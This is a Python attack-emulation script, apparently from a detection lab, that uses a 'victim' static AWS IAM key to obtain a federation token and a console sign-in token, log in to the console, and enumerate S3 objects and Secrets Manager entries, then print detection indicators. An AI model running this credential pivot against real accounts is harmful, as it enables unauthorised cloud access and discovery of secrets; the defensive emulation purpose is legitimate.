# FILE: attack.py
"""
T1538 Cloud Service Dashboard - Atomic Emulation: ATOMIC_CONSOLE_FEDERATION_SIGN
Three-phase attack chain:
  Phase 1 - Federation Token Acquisition: GetFederationToken with victim static IAM key
  Phase 2 - Console Federation and Login: GetSigninToken + ConsoleLogin via signin.amazonaws.com
  Phase 3 - Cloud Dashboard Discovery: S3 bucket enumeration + SecretsManager listing
"""
import sys
import time
import random
import json
import pathlib
import urllib.parse

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
import botocore.exceptions
import requests

# ---------------------------------------------------------------------------
# Resource names: single source of truth
# ---------------------------------------------------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to outputs/defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key) or default


def _p(outputs, key, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> outputs dict -> default."""
    export_key = _PKS.get(key, key)
    return outputs.get(export_key) or default


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


# ---------------------------------------------------------------------------
# Entry point (backend contract: run(outputs, region))
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    T1538 console federation emulation.
    Accepts Pulumi stack outputs dict and region; raises RuntimeError on missing required outputs.
    """

    # -- Resolve required values ------------------------------------------------
    # Dynamic values (account-specific, random suffixes) come from Pulumi outputs
    victim_key_id     = _p(outputs, "victim_access_key_id")
    victim_key_secret = _p(outputs, "victim_secret_access_key")
    target_bucket     = _p(outputs, "target_bucket_name")
    # bait_secret_name is a static known name; Pulumi output overrides if present
    bait_secret       = _p(outputs, "bait_secret_name") or _r("bait_secret_name")

    if not victim_key_id:
        raise RuntimeError("Missing required Pulumi output: victim_access_key_id")
    if not victim_key_secret:
        raise RuntimeError("Missing required Pulumi output: victim_secret_access_key")
    if not target_bucket:
        raise RuntimeError("Missing required Pulumi output: target_bucket_name")
    if not bait_secret:
        raise RuntimeError("Missing required Pulumi output/static name: bait_secret_name")

    events_generated = []

    # All steps wrapped in try/finally so the summary prints even on mid-run failure.
    # This attack is read-only (no persistent resources created); the finally block
    # handles logging cleanup confirmation.
    try:
        # =====================================================================
        # PHASE 1: Federation Token Acquisition
        # =====================================================================
        print_step("Phase 1: Federation Token Acquisition (T1538)")
        print_step("Building victim boto3 session from compromised static IAM key")

        victim_session = boto3.Session(
            aws_access_key_id=victim_key_id,
            aws_secret_access_key=victim_key_secret,
            region_name=region,
        )
        sts = victim_session.client("sts", region_name=region)

        # Inline session policy scopes the federation token to read-only S3 + SecretsManager.
        # Mirrors attacker use-case: pivot from a broad static key to a narrowly-scoped
        # ephemeral credential that looks less suspicious in data plane logs.
        session_policy = json.dumps({
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:GetObject",
                        "s3:ListBucket",
                        "secretsmanager:ListSecrets",
                        "secretsmanager:DescribeSecret",
                    ],
                    "Resource": "*",
                }
            ],
        })

        print_step("Calling sts:GetFederationToken (Name=console-federator, DurationSeconds=900)")
        # Tradecraft: GetFederationToken is only callable by IAM users, not assumed-role
        # sessions. Using it from a programmatic key is atypical for non-CI principals
        # and produces a high-fidelity detection signal in CloudTrail.
        try:
            fed_response = sts.get_federation_token(
                Name="console-federator",
                DurationSeconds=900,
                Policy=session_policy,
            )
        except botocore.exceptions.ClientError as e:
            raise RuntimeError(f"GetFederationToken failed: {e}")

        fed_creds = fed_response["Credentials"]
        federated_user_arn = fed_response["FederatedUser"]["Arn"]
        print_ok("GetFederationToken succeeded")
        print_ok(f"  FederatedUser ARN: {federated_user_arn}")
        print_ok(f"  Temporary credentials expire: {str(fed_creds['Expiration'])}")
        events_generated.append("sts.amazonaws.com: GetFederationToken")

        op_delay(2, 4)

        # Build a boto3 session backed by the federation token for all subsequent API calls
        fed_session = boto3.Session(
            aws_access_key_id=fed_creds["AccessKeyId"],
            aws_secret_access_key=fed_creds["SecretAccessKey"],
            aws_session_token=fed_creds["SessionToken"],
            region_name=region,
        )

        phase_delay()

        # =====================================================================
        # PHASE 2: Console Federation and Login
        # =====================================================================
        print_step("Phase 2: Console Federation and Login (T1538)")

        # -- Step 2: GetSigninToken -------------------------------------------
        # Tradecraft: The AWS federation endpoint converts STS credentials into an
        # opaque SigninToken that can be embedded in a browser-accessible login URL.
        # This HTTP call is logged by CloudTrail as a GetSigninToken Management Event
        # from signin.amazonaws.com.
        print_step("POSTing STS credentials to signin.amazonaws.com to obtain SigninToken")

        session_json = json.dumps({
            "sessionId": fed_creds["AccessKeyId"],
            "sessionKey": fed_creds["SecretAccessKey"],
            "sessionToken": fed_creds["SessionToken"],
        })

        # signin.amazonaws.com is the documented endpoint; fall back to the regional
        # sign-in host when the first name does not resolve from the runner's network.
        federation_endpoints = [
            "https://signin.amazonaws.com/federation",
            "https://us-east-1.signin.aws.amazon.com/federation",
        ]
        federation_endpoint = federation_endpoints[0]

        try:
            token_response = None
            for federation_endpoint in federation_endpoints:
                try:
                    token_response = requests.get(
                        federation_endpoint,
                        params={
                            "Action": "getSigninToken",
                            "SessionDuration": "900",
                            "Session": session_json,
                        },
                        timeout=20,
                    )
                    break
                except requests.ConnectionError as conn_err:
                    print_err(f"{federation_endpoint} unreachable ({type(conn_err).__name__}); trying the next endpoint")
            if token_response is None:
                raise requests.ConnectionError("no sign-in endpoint was reachable")
            token_response.raise_for_status()
            signin_token = token_response.json()["SigninToken"]
            print_ok("GetSigninToken succeeded - SigninToken obtained from the AWS sign-in service")
            events_generated.append("signin.amazonaws.com: GetSigninToken")
        except requests.RequestException as e:
            raise RuntimeError(f"GetSigninToken HTTP request failed: {e}")
        except (KeyError, ValueError) as e:
            raise RuntimeError(f"GetSigninToken response parse failed (unexpected body): {e}")

        op_delay(1, 3)

        # -- Step 3: ConsoleLogin --------------------------------------------
        # Tradecraft: Following the redirect from signin.amazonaws.com to
        # console.aws.amazon.com causes AWS to emit a ConsoleLogin CloudTrail event
        # with userIdentity.type=FederatedUser -- rarely seen from programmatic IAM
        # users outside SSO and a high-confidence detection signal.
        # The non-corporate Issuer (example.com) and Python User-Agent are additional IOCs.
        print_step("Following console login URL to emit ConsoleLogin event (FederatedUser identity)")

        try:
            login_response = requests.get(
                federation_endpoint,
                params={
                    "Action": "login",
                    "Issuer": "https://example.com",
                    "Destination": "https://console.aws.amazon.com/",
                    "SigninToken": signin_token,
                },
                allow_redirects=True,
                timeout=20,
            )
            final_url = login_response.url
            print_ok(f"Console login redirect followed - HTTP {login_response.status_code}")
            print_ok(f"  Final URL (truncated): {final_url[:80]}")
            print_ok("ConsoleLogin CloudTrail event emitted with userIdentity.type=FederatedUser")
            events_generated.append("signin.amazonaws.com: ConsoleLogin (userIdentity.type=FederatedUser)")
        except requests.RequestException as e:
            # Non-fatal: the federation token was issued and the HTTP call was attempted;
            # network-level redirect failure does not prevent CloudTrail event emission.
            print_err(f"Console login redirect error (CloudTrail event may still have been emitted): {e}")

        op_delay(3, 6)

        phase_delay()

        # =====================================================================
        # PHASE 3: Cloud Dashboard Discovery
        # =====================================================================
        print_step("Phase 3: Cloud Dashboard Discovery (T1538 - S3 + SecretsManager enumeration)")

        # -- Step 4: S3 bucket enumeration ------------------------------------
        # Tradecraft: Simulates attacker browsing the S3 console section after gaining
        # federated access -- identifying production-named buckets and listing their
        # contents to locate sensitive configuration files and backup exports.
        # ListObjectsV2 from a FederatedUser session is an atypical accessor type for
        # S3 data plane operations.
        print_step(f"Enumerating target S3 bucket via federation session: {target_bucket}")

        s3 = fed_session.client("s3", region_name=region)

        try:
            list_resp = s3.list_objects_v2(Bucket=target_bucket)
            objects = list_resp.get("Contents", [])
            print_ok(f"S3 ListObjectsV2 succeeded - {len(objects)} objects in {target_bucket}")
            for obj in objects:
                print_ok(f"  {obj['Key']} ({obj['Size']} bytes)")
        except botocore.exceptions.ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code in ("AccessDenied", "403"):
                print_ok("S3 ListObjectsV2 returned AccessDenied (Deny guard active - expected)")
            else:
                print_err(f"S3 ListObjectsV2 unexpected error [{error_code}]: {e}")

        op_delay(2, 5)

        # -- Step 5: SecretsManager enumeration -------------------------------
        # Tradecraft: After gaining console access, attackers enumerate SecretsManager
        # to identify credential-looking entries. ListSecrets reveals secret names even
        # without GetSecretValue -- the prod-named bait entry is visible and generates
        # high-fidelity CloudTrail Management Events from a FederatedUser principal.
        print_step("Enumerating Secrets Manager via federation session (ListSecrets)")

        sm = fed_session.client("secretsmanager", region_name=region)

        try:
            list_resp = sm.list_secrets()
            secret_list = list_resp.get("SecretList", [])
            print_ok(f"ListSecrets succeeded - {len(secret_list)} secret(s) visible to federation session")
            for s in secret_list:
                print_ok(f"  Secret name: {s.get('Name', 'unknown')}")
            events_generated.append("secretsmanager.amazonaws.com: ListSecrets")
        except botocore.exceptions.ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code in ("AccessDenied", "403"):
                print_ok("ListSecrets returned AccessDenied (Deny guard active - expected)")
            else:
                print_err(f"ListSecrets unexpected error [{error_code}]: {e}")

        op_delay(2, 5)

        print_step(f"Calling DescribeSecret on bait entry: {bait_secret}")
        try:
            desc_resp = sm.describe_secret(SecretId=bait_secret)
            secret_arn = desc_resp.get("ARN", "")
            print_ok(f"DescribeSecret succeeded - Name: {desc_resp.get('Name')}")
            print_ok(f"  ARN: {secret_arn[:80]}")
            print_ok(f"  Description: {desc_resp.get('Description', '(none)')}")
            events_generated.append("secretsmanager.amazonaws.com: DescribeSecret")
        except botocore.exceptions.ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code in ("AccessDenied", "403"):
                print_ok("DescribeSecret returned AccessDenied (Deny guard active - expected)")
            elif error_code == "ResourceNotFoundException":
                print_err(f"DescribeSecret: secret not found [{bait_secret}] - check Pulumi outputs")
            else:
                print_err(f"DescribeSecret unexpected error [{error_code}]: {e}")

        op_delay(2, 5)

    finally:
        # =====================================================================
        # Cleanup confirmation
        # Federation token (TTL=900s) and SigninToken expire automatically.
        # No persistent resources were created by this attack chain.
        # =====================================================================
        print("\n" + "=" * 60)
        print("[*] ATOMIC_CONSOLE_FEDERATION_SIGN emulation complete")
        print("=" * 60)
        print("[*] CloudTrail events generated:")
        for evt in events_generated:
            print(f"    - {evt}")
        print("[*] S3 data plane events (only if S3 data event logging enabled for bucket):")
        print(f"    - s3.amazonaws.com: ListObjectsV2 on {target_bucket}")
        print("[*] Key detection IOCs:")
        print("    - GetFederationToken called by static IAM user key (atypical for non-CI principals)")
        print("    - GetSigninToken from a non-browser User-Agent (Python requests)")
        print("    - ConsoleLogin with userIdentity.type=FederatedUser from programmatic principal")
        print("    - Issuer=https://example.com in ConsoleLogin event (non-corporate domain)")
        print("    - SecretsManager enumeration from a FederatedUser session principal")
        print("[*] Cleanup: federation token TTL=900s (auto-expired); no persistent resources created")
        print("=" * 60)
